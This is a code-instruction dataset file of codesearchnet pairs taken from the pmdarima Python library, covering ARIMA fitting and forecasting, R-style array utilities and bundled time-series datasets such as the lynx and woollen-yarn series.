{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nplot a series partial auto - correlation as a line plot.", "response": "def plot_pacf(series, ax=None, lags=None, alpha=None, method='yw',\n              use_vlines=True, title='Partial Autocorrelation', zero=True,\n              vlines_kwargs=None, show=True, **kwargs):\n    \"\"\"Plot a series' partial auto-correlation as a line plot.\n\n    A wrapper method for the statsmodels ``plot_pacf`` method.\n\n    Parameters\n    ----------\n    series : array-like, shape=(n_samples,)\n        The series or numpy array for which to plot an auto-correlation.\n\n    ax : Matplotlib AxesSubplot instance, optional\n        If given, this subplot is used to plot in instead of a new figure being\n        created.\n\n    lags : int, array-like or None, optional (default=None)\n        int or Array of lag values, used on horizontal axis. Uses\n        np.arange(lags) when lags is an int.  If not provided,\n        ``lags=np.arange(len(corr))`` is used.\n\n    alpha : scalar, optional (default=None)\n        If a number is given, the confidence intervals for the given level are\n        returned. For instance if alpha=.05, 95 % confidence intervals are\n        returned where the standard deviation is computed according to\n        Bartlett's formula. If None, no confidence intervals are plotted.\n\n    method : str, optional (default='yw')\n        Specifies which method for the calculations to use. One of\n        {'ywunbiased', 'ywmle', 'ols', 'ld', 'ldb', 'ldunbiased', 'ldbiased'}:\n\n        - yw or ywunbiased : yule walker with bias correction in denominator\n          for acovf. Default.\n        - ywm or ywmle : yule walker without bias correction\n        - ols - regression of time series on lags of it and on constant\n        - ld or ldunbiased : Levinson-Durbin recursion with bias correction\n        - ldb or ldbiased : Levinson-Durbin recursion without bias correction\n\n    use_vlines : bool, optional (default=True)\n        If True, vertical lines and markers are plotted.\n        If False, only markers are plotted.  The default marker is 'o'; it can\n        be overridden with a ``marker`` kwarg.\n\n    title : str, optional (default='Partial Autocorrelation')\n        Title to place on plot. Default is 'Partial Autocorrelation'\n\n    zero : bool, optional (default=True)\n        Flag indicating whether to include the 0-lag autocorrelation.\n        Default is True.\n\n    vlines_kwargs : dict, optional (default=None)\n        Optional dictionary of keyword arguments that are passed to vlines.\n\n    show : bool, optional (default=True)\n        Whether to show the plot after it's been created. If not, will return\n        the plot as an Axis object instead.\n\n    **kwargs : kwargs, optional\n        Optional keyword arguments that are directly passed on to the\n        Matplotlib ``plot`` and ``axhline`` functions.\n\n    Notes\n    -----\n    This method will only show the plot if ``show=True`` (which is the default\n    behavior). To simply get the axis back (say, to add to another canvas),\n    use ``show=False``.\n\n    Examples\n    --------\n    >>> plot_pacf([1, 2, 3, 4], show=False)  # doctest: +SKIP\n    <matplotlib.figure.Figure object at 0x129df1630>\n\n    Returns\n    -------\n    plt : Axis or None\n        If ``show`` is True, does not return anything. If False, returns\n        the Axis object.\n    \"\"\"\n    _err_for_no_mpl()\n    res = ppacf(x=series, ax=ax, lags=lags, alpha=alpha, method=method,\n                use_vlines=use_vlines, title=title, zero=zero,\n                vlines_kwargs=vlines_kwargs, **kwargs)\n\n    return _show_or_return(res, show)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ntweaking for building extensions between release and development mode.", "response": "def maybe_cythonize_extensions(top_path, config):\n    \"\"\"Tweaks for building extensions between release and development mode.\"\"\"\n    is_release = os.path.exists(os.path.join(top_path, 'PKG-INFO'))\n\n    if is_release:\n        build_from_c_and_cpp_files(config.ext_modules)\n    else:\n        message = ('Please install cython with a version >= {0} in order '\n                   'to build a pmdarima development version.').format(\n                       CYTHON_MIN_VERSION)\n        try:\n            import Cython\n            if LooseVersion(Cython.__version__) < CYTHON_MIN_VERSION:\n                message += ' Your version of Cython was {0}.'.format(\n                    Cython.__version__)\n                raise ValueError(message)\n            from Cython.Build import cythonize\n        except ImportError as exc:\n            exc.args += (message,)\n            raise\n\n        config.ext_modules = cythonize(config.ext_modules)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef load_airpassengers(as_series=False):\n    rslt = np.array([\n        112, 118, 132, 129, 121, 135, 148, 148, 136, 119, 104, 118,\n        115, 126, 141, 135, 125, 149, 170, 170, 158, 133, 114, 140,\n        145, 150, 178, 163, 172, 178, 199, 199, 184, 162, 146, 166,\n        171, 180, 193, 181, 183, 218, 230, 242, 209, 191, 172, 194,\n        196, 196, 236, 235, 229, 243, 264, 272, 237, 211, 180, 201,\n        204, 188, 235, 227, 234, 264, 302, 293, 259, 229, 203, 229,\n        242, 233, 267, 269, 270, 315, 364, 347, 312, 274, 237, 278,\n        284, 277, 317, 313, 318, 374, 413, 405, 355, 306, 271, 306,\n        315, 301, 356, 348, 355, 422, 465, 467, 404, 347, 305, 336,\n        340, 318, 362, 348, 363, 435, 491, 505, 404, 359, 310, 337,\n        360, 342, 406, 396, 420, 472, 548, 559, 463, 407, 362, 405,\n        417, 391, 419, 461, 472, 535, 622, 606, 508, 461, 390, 432\n    ]).astype(np.float64)\n\n    if as_series:\n        return pd.Series(rslt)\n    return rslt", "response": "Load the airline passengers from the local file system."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nwrapping a delegated instance attribute function.", "response": "def if_has_delegate(delegate):\n    \"\"\"Wrap a delegated instance attribute function.\n\n    Creates a decorator for methods that are delegated in the presence of a\n    results wrapper. This enables duck-typing by ``hasattr`` returning True\n    according to the sub-estimator.\n\n    This function was adapted from scikit-learn, which defines\n    ``if_delegate_has_method``, but operates differently by injecting methods\n    not based on method presence, but by delegate presence.\n\n    Examples\n    --------\n    >>> from pmdarima.utils.metaestimators import if_has_delegate\n    >>>\n    >>> class A(object):\n    ...     @if_has_delegate('d')\n    ...     def func(self):\n    ...         return True\n    >>>\n    >>> a = A()\n    >>> # the delegate does not exist yet\n    >>> assert not hasattr(a, 'func')\n    >>> # inject the attribute\n    >>> a.d = None\n    >>> assert hasattr(a, 'func') and a.func()\n\n    Parameters\n    ----------\n    delegate : string, list of strings or tuple of strings\n        Name of the sub-estimator that can be accessed as an attribute of the\n        base object. If a list or a tuple of names are provided, the first\n        sub-estimator that is an attribute of the base object will be used.\n    \"\"\"\n    if isinstance(delegate, list):\n        delegate = tuple(delegate)\n    if not isinstance(delegate, tuple):\n        delegate = (delegate,)\n\n    return lambda fn: _IffHasDelegate(fn, delegate)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nuniform heart - rate data borrowed from an anonymized base.", "response": "def load_heartrate(as_series=False):\n    \"\"\"Uniform heart-rate data.\n\n    A sample of heartrate data borrowed from an\n    `MIT database <http://ecg.mit.edu/time-series/>`_. The sample consists\n    of 150 evenly spaced (0.5 seconds) heartrate measurements.\n\n    Parameters\n    ----------\n    as_series : bool, optional (default=False)\n        Whether to return a Pandas series. If False, will return a 1d\n        numpy array.\n\n    Returns\n    -------\n    rslt : array-like, shape=(n_samples,)\n        The heartrate vector.\n\n    Examples\n    --------\n    >>> from pmdarima.datasets import load_heartrate\n    >>> load_heartrate()\n    array([84.2697, 84.2697, 84.0619, 85.6542, 87.2093, 87.1246, 86.8726,\n           86.7052, 87.5899, 89.1475, 89.8204, 89.8204, 90.4375, 91.7605,\n           93.1081, 94.3291, 95.8003, 97.5119, 98.7457, 98.904 , 98.3437,\n           98.3075, 98.8313, 99.0789, 98.8157, 98.2998, 97.7311, 97.6471,\n           97.7922, 97.2974, 96.2042, 95.2318, 94.9367, 95.0867, 95.389 ,\n           95.5414, 95.2439, 94.9415, 95.3557, 96.3423, 97.1563, 97.4026,\n           96.7028, 96.5516, 97.9837, 98.9879, 97.6312, 95.4064, 93.8603,\n           93.0552, 94.6012, 95.8476, 95.7692, 95.9236, 95.7692, 95.9211,\n           95.8501, 94.6703, 93.0993, 91.972 , 91.7821, 91.7911, 90.807 ,\n           89.3196, 88.1511, 88.7762, 90.2265, 90.8066, 91.2284, 92.4238,\n           93.243 , 92.8472, 92.5926, 91.7778, 91.2974, 91.6364, 91.2952,\n           91.771 , 93.2285, 93.3199, 91.8799, 91.2239, 92.4055, 93.8716,\n           94.5825, 94.5594, 94.9453, 96.2412, 96.6879, 95.8295, 94.7819,\n           93.4731, 92.7997, 92.963 , 92.6996, 91.9648, 91.2417, 91.9312,\n           93.9548, 95.3044, 95.2511, 94.5358, 93.8093, 93.2287, 92.2065,\n           92.1588, 93.6376, 94.899 , 95.1592, 95.2415, 95.5414, 95.0971,\n           94.528 , 95.5887, 96.4715, 96.6158, 97.0769, 96.8531, 96.3947,\n           97.4291, 98.1767, 97.0148, 96.044 , 95.9581, 96.4814, 96.5211,\n           95.3629, 93.5741, 92.077 , 90.4094, 90.1751, 91.3312, 91.2883,\n           89.0592, 87.052 , 86.6226, 85.7889, 85.6348, 85.3911, 83.8064,\n           82.8729, 82.6266, 82.645 , 82.645 , 82.645 , 82.645 , 82.645 ,\n           82.645 , 82.645 , 82.645 ])\n\n    >>> load_heartrate(True).head()\n    0    84.2697\n    1    84.2697\n    2    84.0619\n    3    85.6542\n    4    87.2093\n    dtype: float64\n\n    References\n    ----------\n    .. [1] Goldberger AL, Rigney DR. Nonlinear dynamics at the bedside.\n           In: Glass L, Hunter P, McCulloch A, eds.\n           Theory of Heart: Biomechanics, Biophysics, and Nonlinear\n           Dynamics of Cardiac Function. New York: Springer-Verlag, 1991,\n           pp. 583-605.\n    \"\"\"\n    rslt = np.array([84.2697, 84.2697, 84.0619, 85.6542, 87.2093, 87.1246,\n                     86.8726, 86.7052, 87.5899, 89.1475, 89.8204, 89.8204,\n                     90.4375, 91.7605, 93.1081, 94.3291, 95.8003, 97.5119,\n                     98.7457, 98.904, 98.3437, 98.3075, 98.8313, 99.0789,\n                     98.8157, 98.2998, 97.7311, 97.6471, 97.7922, 97.2974,\n                     96.2042, 95.2318, 94.9367, 95.0867, 95.389, 95.5414,\n                     95.2439, 94.9415, 95.3557, 96.3423, 97.1563, 97.4026,\n                     96.7028, 96.5516, 97.9837, 98.9879, 97.6312, 95.4064,\n                     93.8603, 93.0552, 94.6012, 95.8476, 95.7692, 95.9236,\n                     95.7692, 95.9211, 95.8501, 94.6703, 93.0993, 91.972,\n                     91.7821, 91.7911, 90.807, 89.3196, 88.1511, 88.7762,\n                     90.2265, 90.8066, 91.2284, 92.4238, 93.243, 92.8472,\n                     92.5926, 91.7778, 91.2974, 91.6364, 91.2952, 91.771,\n                     93.2285, 93.3199, 91.8799, 91.2239, 92.4055, 93.8716,\n                     94.5825, 94.5594, 94.9453, 96.2412, 96.6879, 95.8295,\n                     94.7819, 93.4731, 92.7997, 92.963, 92.6996, 91.9648,\n                     91.2417, 91.9312, 93.9548, 95.3044, 95.2511, 94.5358,\n                     93.8093, 93.2287, 92.2065, 92.1588, 93.6376, 94.899,\n                     95.1592, 95.2415, 95.5414, 95.0971, 94.528, 95.5887,\n                     96.4715, 96.6158, 97.0769, 96.8531, 96.3947, 97.4291,\n                     98.1767, 97.0148, 96.044, 95.9581, 96.4814, 96.5211,\n                     95.3629, 93.5741, 92.077, 90.4094, 90.1751, 91.3312,\n                     91.2883, 89.0592, 87.052, 86.6226, 85.7889, 85.6348,\n                     85.3911, 83.8064, 82.8729, 82.6266, 82.645, 82.645,\n                     82.645, 82.645, 82.645, 82.645, 82.645, 82.645])\n\n    if as_series:\n        return pd.Series(rslt)\n    return rslt"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nloading the woollen yarn in Australia and return a Pandas Series.", "response": "def load_woolyrnq(as_series=False):\n    \"\"\"Quarterly production of woollen yarn in Australia.\n\n    This time-series records the quarterly production (in tonnes) of woollen\n    yarn in Australia between Mar 1965 and Sep 1994.\n\n    Parameters\n    ----------\n    as_series : bool, optional (default=False)\n        Whether to return a Pandas series. If True, the index will be set to\n        the observed years/quarters. If False, will return a 1d numpy array.\n\n    Examples\n    --------\n    >>> from pmdarima.datasets import load_woolyrnq\n    >>> load_woolyrnq()\n    array([6172, 6709, 6633, 6660, 6786, 6800, 6730, 6765, 6720, 7133, 6946,\n           7095, 7047, 6757, 6915, 6921, 7064, 7206, 7190, 7402, 7819, 7300,\n           7105, 7259, 7001, 7475, 6840, 7061, 5845, 7529, 7819, 6943, 5714,\n           6556, 7045, 5947, 5463, 6127, 5540, 4235, 3324, 4793, 5906, 5834,\n           5240, 5458, 5505, 5002, 3999, 4826, 5318, 4681, 4442, 5305, 5466,\n           4995, 4573, 5081, 5696, 5079, 4373, 4986, 5341, 4800, 4161, 5007,\n           5464, 5127, 4240, 5338, 5129, 4437, 3642, 4602, 5524, 4895, 4380,\n           5186, 6080, 5588, 5009, 5663, 6540, 6262, 5169, 5819, 6339, 5981,\n           4766, 5976, 6590, 5590, 5135, 5762, 6077, 5882, 4247, 5264, 5146,\n           4868, 4329, 4869, 5127, 4868, 3827, 4987, 5222, 4928, 3930, 4469,\n           4954, 4752, 3888, 4588, 5309, 4732, 4837, 6135, 6396])\n\n    >>> load_woolyrnq(True).head()\n    Q1 1965    6172\n    Q2 1965    6709\n    Q3 1965    6633\n    Q4 1965    6660\n    Q1 1966    6786\n    dtype: int64\n\n    Notes\n    -----\n    This is quarterly data, so *m* should be set to 4 when using in a seasonal\n    context.\n\n    References\n    ----------\n    .. [1] https://www.rdocumentation.org/packages/forecast/versions/8.1/topics/woolyrnq  # noqa: E501\n\n    Returns\n    -------\n    rslt : array-like, shape=(n_samples,)\n        The woolyrnq dataset. There are 119 observations.\n    \"\"\"\n    rslt = np.array([\n        6172, 6709, 6633, 6660,\n        6786, 6800, 6730, 6765,\n        6720, 7133, 6946, 7095,\n        7047, 6757, 6915, 6921,\n        7064, 7206, 7190, 7402,\n        7819, 7300, 7105, 7259,\n        7001, 7475, 6840, 7061,\n        5845, 7529, 7819, 6943,\n        5714, 6556, 7045, 5947,\n        5463, 6127, 5540, 4235,\n        3324, 4793, 5906, 5834,\n        5240, 5458, 5505, 5002,\n        3999, 4826, 5318, 4681,\n        4442, 5305, 5466, 4995,\n        4573, 5081, 5696, 5079,\n        4373, 4986, 5341, 4800,\n        4161, 5007, 5464, 5127,\n        4240, 5338, 5129, 4437,\n        3642, 4602, 5524, 4895,\n        4380, 5186, 6080, 5588,\n        5009, 5663, 6540, 6262,\n        5169, 5819, 6339, 5981,\n        4766, 5976, 6590, 5590,\n        5135, 5762, 6077, 5882,\n        4247, 5264, 5146, 4868,\n        4329, 4869, 5127, 4868,\n        3827, 4987, 5222, 4928,\n        3930, 4469, 4954, 4752,\n        3888, 4588, 5309, 4732,\n        4837, 6135, 6396])\n\n    if not as_series:\n        return rslt\n\n    # Otherwise we want a series and have to cleverly create the index\n    # (with quarters, and we don't want Q4 in 1994)\n    index = [\n        \"Q%i %i\" % (i + 1, year)\n        for year in range(1965, 1995)\n        for i in range(4)\n    ][:-1]  # trim off the last one.\n\n    return pd.Series(rslt, index=index)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncast an iterable to a Pandas Series object.", "response": "def as_series(x):\n    \"\"\"Cast as pandas Series.\n\n    Cast an iterable to a Pandas Series object. Note that the index\n    will simply be a positional ``arange`` and cannot be set in this\n    function.\n\n    Parameters\n    ----------\n    x : array-like, shape=(n_samples,)\n        The 1d array on which to compute the auto correlation.\n\n    Examples\n    --------\n    >>> as_series([1, 2, 3])\n    0    1\n    1    2\n    2    3\n    dtype: int64\n\n    >>> as_series(as_series((1, 2, 3)))\n    0    1\n    1    2\n    2    3\n    dtype: int64\n\n    >>> import pandas as pd\n    >>> as_series(pd.Series([4, 5, 6], index=['a', 'b', 'c']))\n    a    4\n    b    5\n    c    6\n    dtype: int64\n\n    Returns\n    -------\n    s : pd.Series\n        A pandas Series object.\n    \"\"\"\n    if isinstance(x, pd.Series):\n        return x\n    return pd.Series(column_or_1d(x))"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef c(*args):\n    # R returns NULL for this\n    if not args:\n        return None\n\n    # just an array of len 1\n    if len(args) == 1:\n        element = args[0]\n\n        # if it's iterable, make it an array\n        if is_iterable(element):\n            return np.asarray(element)\n\n        # otherwise it's not iterable, put it in an array\n        return np.asarray([element])\n\n    # np.concat all. This can be slow, as noted by numerous threads on\n    # numpy concat efficiency, however an alternative using recursive\n    # yields was tested and performed far worse:\n    #\n    # >>> def timeit(func, ntimes, *args):\n    # ...     times = []\n    # ...     for i in range(ntimes):\n    # ...         start = time.time()\n    # ...         func(*args)\n    # ...         times.append(time.time() - start)\n    # ...     arr = np.asarray(times)\n    # ...     print(\"%s (%i times) - Mean: %.5f sec, \"\n    # ...           \"Min: %.5f sec, Max: %.5f\" % (func.__name__, ntimes,\n    # ...                                         arr.mean(), arr.min(),\n    # ...                                         arr.max()))\n    # >>> y = [np.arange(10000), range(500), (1000,), 100, np.arange(50000)]\n    # >>> timeit(c1, 100, *y)\n    # c1 (100 times) - Mean: 0.00009 sec, Min: 0.00006 sec, Max: 0.00065\n    # >>> timeit(c2, 100, *y)\n    # c2 (100 times) - Mean: 0.08708 sec, Min: 0.08273 sec, Max: 0.10115\n    #\n    # So we stick with c1, which is this variant.\n    return np.concatenate([a if is_iterable(a) else [a] for a in args])", "response": "r Imitates the c function from R."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef diff(x, lag=1, differences=1):\n    if any(v < 1 for v in (lag, differences)):\n        raise ValueError('lag and differences must be positive (> 0) integers')\n\n    x = check_array(x, ensure_2d=False, dtype=np.float32)  # type: np.ndarray\n    fun = _diff_vector if x.ndim == 1 else _diff_matrix\n    res = x\n\n    # \"recurse\" over range of differences\n    for i in range(differences):\n        res = fun(res, lag)\n        # if it ever comes back empty, just return it as is\n        if not res.shape[0]:\n            return res\n\n    return res", "response": "Difference an array.\n\n    A python implementation of the R ``diff`` function [1]. This computes lag\n    differences from an array given a ``lag`` and ``differencing`` term.\n\n    If ``x`` is a vector of length :math:`n`, ``lag=1`` and ``differences=1``,\n    then the computed result is equal to the successive differences\n    ``x[lag:n] - x[:n-lag]``.\n\n    Examples\n    --------\n    Where ``lag=1`` and ``differences=1``:\n\n    >>> x = c(10, 4, 2, 9, 34)\n    >>> diff(x, 1, 1)\n    array([ -6.,  -2.,   7.,  25.], dtype=float32)\n\n    Where ``lag=1`` and ``differences=2``:\n\n    >>> x = c(10, 4, 2, 9, 34)\n    >>> diff(x, 1, 2)\n    array([  4.,   9.,  18.], dtype=float32)\n\n    Where ``lag=3`` and ``differences=1``:\n\n    >>> x = c(10, 4, 2, 9, 34)\n    >>> diff(x, 3, 1)\n    array([ -1.,  30.], dtype=float32)\n\n    Where ``lag=6`` (larger than the array is) and ``differences=1``:\n\n    >>> x = c(10, 4, 2, 9, 34)\n    >>> diff(x, 6, 1)\n    array([], dtype=float32)\n\n    For a 2d array with ``lag=1`` and ``differences=1``:\n\n    >>> import numpy as np\n    >>>\n    >>> x = np.arange(1, 10).reshape((3, 3)).T\n    >>> diff(x, 1, 1)\n    array([[ 1.,  1.,  1.],\n           [ 1.,  1.,  1.]], dtype=float32)\n\n    Parameters\n    ----------\n    x : array-like, shape=(n_samples, [n_features])\n        The array to difference.\n\n    lag : int, optional (default=1)\n        An integer > 0 indicating which lag to use.\n\n    differences : int, optional (default=1)\n        An integer > 0 indicating the order of the difference.\n\n    Returns\n    -------\n    res : np.ndarray, shape=(n_samples, [n_features])\n        The result of the differenced arrays.\n\n    References\n    ----------\n    .. [1] https://stat.ethz.ch/R-manual/R-devel/library/base/html/diff.html"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef deprecated(use_instead, notes=None):\n    if notes is None:\n        notes = \"\"\n    else:\n        notes = \" \" + notes\n\n    def wrapped_func(func):\n        @functools.wraps(func)\n        def _inner(*args, **kwargs):\n            warnings.simplefilter('always', DeprecationWarning)  # un-filter\n            msg = (\"{0} is deprecated and will be removed in a future \"\n                   \"release of pmdarima. Use {1} instead.{2}\"\n                   .format(func.__name__, use_instead, notes))\n\n            warnings.warn(\n                msg,\n                category=DeprecationWarning,\n                stacklevel=2)\n            warnings.simplefilter('default', DeprecationWarning)  # re-filter\n            return func(*args, **kwargs)\n        return _inner\n    return wrapped_func", "response": "Mark functions as deprecated."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nloading a series of lynx trappings for 1821 and 1934 in Canada.", "response": "def load_lynx(as_series=False):\n    \"\"\"Annual numbers of lynx trappings for 1821\u20131934 in Canada.\n\n    This time-series records the number of skins of predators (lynx) that were\n    collected over several years by the Hudson's Bay Company. The dataset was\n    taken from Brockwell & Davis (1991) and appears to be the series\n    considered by Campbell & Walker (1977).\n\n    Parameters\n    ----------\n    as_series : bool, optional (default=False)\n        Whether to return a Pandas series. If True, the index will be set to\n        the observed years. If False, will return a 1d numpy array.\n\n    Examples\n    --------\n    >>> from pmdarima.datasets import load_lynx\n    >>> load_lynx()\n    array([ 269,  321,  585,  871, 1475, 2821, 3928, 5943, 4950, 2577,  523,\n             98,  184,  279,  409, 2285, 2685, 3409, 1824,  409,  151,   45,\n             68,  213,  546, 1033, 2129, 2536,  957,  361,  377,  225,  360,\n            731, 1638, 2725, 2871, 2119,  684,  299,  236,  245,  552, 1623,\n           3311, 6721, 4254,  687,  255,  473,  358,  784, 1594, 1676, 2251,\n           1426,  756,  299,  201,  229,  469,  736, 2042, 2811, 4431, 2511,\n            389,   73,   39,   49,   59,  188,  377, 1292, 4031, 3495,  587,\n            105,  153,  387,  758, 1307, 3465, 6991, 6313, 3794, 1836,  345,\n            382,  808, 1388, 2713, 3800, 3091, 2985, 3790,  674,   81,   80,\n            108,  229,  399, 1132, 2432, 3574, 2935, 1537,  529,  485,  662,\n           1000, 1590, 2657, 3396])\n\n    >>> load_lynx(True).head()\n    1821     269\n    1822     321\n    1823     585\n    1824     871\n    1825    1475\n    dtype: int64\n\n    Notes\n    -----\n    This is annual data and not seasonal in nature (i.e., :math:`m=1`)\n\n    References\n    ----------\n    .. [1] Brockwell, P. J. and Davis, R. A. (1991)\n           Time Series and Forecasting Methods. Second edition.\n           Springer. Series G (page 557).\n\n    .. [2] https://stat.ethz.ch/R-manual/R-devel/library/datasets/html/lynx.html  # noqa: E501\n\n    Returns\n    -------\n    lynx : array-like, shape=(n_samples,)\n        The lynx dataset. There are 114 observations.\n    \"\"\"\n    rslt = np.array([269, 321, 585, 871, 1475, 2821, 3928, 5943, 4950,\n                     2577, 523, 98, 184, 279, 409, 2285, 2685, 3409,\n                     1824, 409, 151, 45, 68, 213, 546, 1033, 2129,\n                     2536, 957, 361, 377, 225, 360, 731, 1638, 2725,\n                     2871, 2119, 684, 299, 236, 245, 552, 1623, 3311,\n                     6721, 4254, 687, 255, 473, 358, 784, 1594, 1676,\n                     2251, 1426, 756, 299, 201, 229, 469, 736, 2042,\n                     2811, 4431, 2511, 389, 73, 39, 49, 59, 188,\n                     377, 1292, 4031, 3495, 587, 105, 153, 387, 758,\n                     1307, 3465, 6991, 6313, 3794, 1836, 345, 382, 808,\n                     1388, 2713, 3800, 3091, 2985, 3790, 674, 81, 80,\n                     108, 229, 399, 1132, 2432, 3574, 2935, 1537, 529,\n                     485, 662, 1000, 1590, 2657, 3396])\n\n    # Set the index if necessary\n    if as_series:\n        return pd.Series(rslt, index=range(1821, 1935))\n    return rslt"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _aicc(model_results, nobs):\n    aic = model_results.aic\n    df_model = model_results.df_model + 1  # add one for constant term\n    return aic + 2. * df_model * (nobs / (nobs - df_model - 1.) - 1.)", "response": "Compute the corrected Akaike Information Criterion"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _append_to_endog(endog, new_y):\n    return np.concatenate((endog, new_y)) if \\\n        endog.ndim == 1 else \\\n        np.concatenate((endog.ravel(), new_y))[:, np.newaxis]", "response": "Append to the endogenous array"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef fit(self, y, exogenous=None, **fit_args):\n        y = c1d(check_array(y, ensure_2d=False, force_all_finite=False,\n                            copy=True, dtype=DTYPE))  # type: np.ndarray\n        n_samples = y.shape[0]\n\n        # if exog was included, check the array...\n        if exogenous is not None:\n            exogenous = check_array(exogenous, ensure_2d=True,\n                                    force_all_finite=False,\n                                    copy=False, dtype=DTYPE)\n\n        # determine the CV args, if any\n        cv = self.out_of_sample_size\n        scoring = get_callable(self.scoring, VALID_SCORING)\n\n        # don't allow negative, don't allow > n_samples\n        cv = max(cv, 0)\n\n        # if cv is too big, raise\n        if cv >= n_samples:\n            raise ValueError(\"out-of-sample size must be less than number \"\n                             \"of samples!\")\n\n        # If we want to get a score on the out-of-sample, we need to trim\n        # down the size of our y vec for fitting. Addressed due to Issue #28\n        cv_samples = None\n        cv_exog = None\n        if cv:\n            cv_samples = y[-cv:]\n            y = y[:-cv]\n\n            # This also means we have to address the exogenous matrix\n            if exogenous is not None:\n                cv_exog = exogenous[-cv:, :]\n                exogenous = exogenous[:-cv, :]\n\n        # Internal call\n        self._fit(y, exogenous, **fit_args)\n\n        # now make a forecast if we're validating to compute the\n        # out-of-sample score\n        if cv_samples is not None:\n            # get the predictions (use self.predict, which calls forecast\n            # from statsmodels internally)\n            pred = self.predict(n_periods=cv, exogenous=cv_exog)\n            self.oob_ = scoring(cv_samples, pred, **self.scoring_args)\n            self.oob_preds_ = pred\n\n            # If we compute out of sample scores, we have to now update the\n            # observed time points so future forecasts originate from the end\n            # of our y vec\n            self.update(cv_samples, cv_exog, **fit_args)\n        else:\n            self.oob_ = np.nan\n            self.oob_preds_ = None\n\n        return self", "response": "Fit an ARIMA to a vector y of observations with an optional matrix of exogenous variables."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngenerating in - sample predictions from the fit ARIMA model. This is a convenience method that is used to compute the residuals of the fit ARIMA model.", "response": "def predict_in_sample(self, exogenous=None, start=None,\n                          end=None, dynamic=False):\n        \"\"\"Generate in-sample predictions from the fit ARIMA model. This can\n        be useful when wanting to visualize the fit, and qualitatively inspect\n        the efficacy of the model, or when wanting to compute the residuals\n        of the model.\n\n        Parameters\n        ----------\n        exogenous : array-like, shape=[n_obs, n_vars], optional (default=None)\n            An optional 2-d array of exogenous variables. If provided, these\n            variables are used as additional features in the regression\n            operation. This should not include a constant or trend. Note that\n            if an ``ARIMA`` is fit on exogenous features, it must be provided\n            exogenous features for making predictions.\n\n        start : int, optional (default=None)\n            Zero-indexed observation number at which to start forecasting, ie.,\n            the first forecast is start.\n\n        end : int, optional (default=None)\n            Zero-indexed observation number at which to end forecasting, ie.,\n            the first forecast is start.\n\n        dynamic : bool, optional\n            The `dynamic` keyword affects in-sample prediction. If dynamic\n            is False, then the in-sample lagged values are used for\n            prediction. If `dynamic` is True, then in-sample forecasts are\n            used in place of lagged dependent variables. The first forecasted\n            value is `start`.\n\n        Returns\n        -------\n        predict : array\n            The predicted values.\n        \"\"\"\n        check_is_fitted(self, 'arima_res_')\n\n        # if we fit with exog, make sure one was passed:\n        exogenous = self._check_exog(exogenous)  # type: np.ndarray\n        return self.arima_res_.predict(exog=exogenous, start=start,\n                                       end=end, dynamic=dynamic)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef predict(self, n_periods=10, exogenous=None,\n                return_conf_int=False, alpha=0.05):\n        \"\"\"Forecast future values\n\n        Generate predictions (forecasts) ``n_periods`` in the future.\n        Note that if ``exogenous`` variables were used in the model fit, they\n        will be expected for the predict procedure and will fail otherwise.\n\n        Parameters\n        ----------\n        n_periods : int, optional (default=10)\n            The number of periods in the future to forecast.\n\n        exogenous : array-like, shape=[n_obs, n_vars], optional (default=None)\n            An optional 2-d array of exogenous variables. If provided, these\n            variables are used as additional features in the regression\n            operation. This should not include a constant or trend. Note that\n            if an ``ARIMA`` is fit on exogenous features, it must be provided\n            exogenous features for making predictions.\n\n        return_conf_int : bool, optional (default=False)\n            Whether to get the confidence intervals of the forecasts.\n\n        alpha : float, optional (default=0.05)\n            The confidence intervals for the forecasts are (1 - alpha) %\n\n        Returns\n        -------\n        forecasts : array-like, shape=(n_periods,)\n            The array of fore-casted values.\n\n        conf_int : array-like, shape=(n_periods, 2), optional\n            The confidence intervals for the forecasts. Only returned if\n            ``return_conf_int`` is True.\n        \"\"\"\n        check_is_fitted(self, 'arima_res_')\n        if not isinstance(n_periods, (int, long)):\n            raise TypeError(\"n_periods must be an int or a long\")\n\n        # if we fit with exog, make sure one was passed:\n        exogenous = self._check_exog(exogenous)  # type: np.ndarray\n        if exogenous is not None and exogenous.shape[0] != n_periods:\n            raise ValueError('Exogenous array dims (n_rows) != n_periods')\n\n        # ARIMA/ARMA predict differently...\n        if not self._is_seasonal():\n            # use the results wrapper to predict so it injects its own params\n            # (also if I was 0, ARMA will not have a forecast method natively)\n            f, _, conf_int = self.arima_res_.forecast(\n                steps=n_periods, exog=exogenous, alpha=alpha)\n        else:  # SARIMAX\n            # Unfortunately, SARIMAX does not really provide a nice way to get\n            # the confidence intervals out of the box, so we have to perform\n            # the get_prediction code here and unpack the confidence intervals\n            # manually.\n            # f = self.arima_res_.forecast(steps=n_periods, exog=exogenous)\n            arima = self.arima_res_\n            end = arima.nobs + n_periods - 1\n            results = arima.get_prediction(start=arima.nobs,\n                                           end=end,\n                                           exog=exogenous)\n            f = results.predicted_mean\n            conf_int = results.conf_int(alpha=alpha)\n\n        if return_conf_int:\n            # The confidence intervals may be a Pandas frame if it comes from\n            # SARIMAX & we want Numpy. We will to duck type it so we don't add\n            # new explicit requirements for the package\n            return f, check_array(conf_int, force_all_finite=False)\n        return f", "response": "Generate predictions for the given number of periods in the future."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef add_new_observations(self, y, exogenous=None, **kwargs):\n        return self.update(y, exogenous, **kwargs)", "response": "Update the endog and exog samples after a model fit."}
